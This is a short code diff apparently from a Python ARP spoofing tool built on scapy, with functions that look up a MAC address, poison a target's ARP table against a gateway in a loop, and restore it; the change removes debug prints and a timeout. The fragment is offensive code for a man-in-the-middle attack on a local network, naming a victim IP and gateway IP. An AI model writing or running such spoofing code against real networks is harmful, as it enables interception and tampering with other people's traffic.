@@ -18,8 +18,7 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    print("Get MAC for " + ip + " is " + str(answered_list))
+    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 
@@ -36,9 +35,6 @@ def restore_arp_table(victim_ip, false_requester_ip):
 
 
 option = get_arguments()
-print("Target IP: " + option.target_ip)
-print("Gateway IP: " + option.gateway_ip)
-
 try:
     while True:
         spoof_arp_table(option.target_ip, option.gateway_ip)
